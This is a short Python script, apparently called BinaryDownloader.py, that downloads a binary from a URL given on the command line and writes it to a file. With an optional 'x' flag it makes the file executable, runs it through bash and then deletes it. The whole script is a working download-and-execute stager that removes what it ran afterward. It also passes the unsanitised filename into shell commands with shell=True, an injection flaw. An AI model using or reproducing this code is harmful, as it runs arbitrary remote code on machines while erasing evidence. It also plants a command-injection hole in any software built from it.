#!/usr/bin/python3
import requests # Import requests python library to support HTTP requests methods.
import subprocess # Import subprocess library to spawn new subprocess (replace for os.system or os.spawn).
import sys # Import library to get access to the arguments of the launched commands.
import os.path # Import library to check if a file exists

# This simple python code tends to store in a file some binary content downloaded from a URL. Both data have to suplied via arguments.

# The functionality can be separated in the following blocks:
#
#   - First we create the file if this not exists and open to write on it.
#   - Second, we download the content of the binary and write it over the file and close the file.
#   - If its required, we execute the new created file granting permissions first and lastly removing the file.

try:

    Filename = str(sys.argv[1])
    
    if not os.path.isfile(Filename): # We check if the file exists. If not, we create the file.

        print('[+] Creating file.')

        File = open(Filename,'x') # Create the file to store the binary.


    File = open(Filename,'wb') # Next, we open the just created file to write (w) on binary (b) on it.

    URL = str(sys.argv[2])

    print("[+] File created and open. Writing Content.")

    # We create a HTTP object and make a request to download the binary and write the content on the file.

    Response = requests.get(URL)
    File.write(Response.content)

    # Then we close the file.

    print("[+] File writed with the binary. Closing file.")
    
    File.close()

    try:

        if sys.argv[3] == 'x':
            
            # In order to execute the binary, we spawn a subprocess using a subprocess object and methods.

            print("[+] Executing binary.")

            subprocess.call("chmod +x " + Filename + ';/bin/bash -c ' + Filename, shell=True)

            print("[+] Finish. Cleaning enviroment.")
            
            subprocess.call("rm "+ Filename, shell=True)

        else:
            
            print("[!] Third argument is not an 'x'. No execution of the binary and closing program.")
            exit(0)
    except:

        exit(0)
except:

    print("[!] Bad usage! Append FILENAME and URL as argument on the launch command. Add an 'x' as third argument if want execution.")
    print("[!] For example; ./BinaryDownloader.py code.bin http://127.0.0.1:8080/binary.bin") 
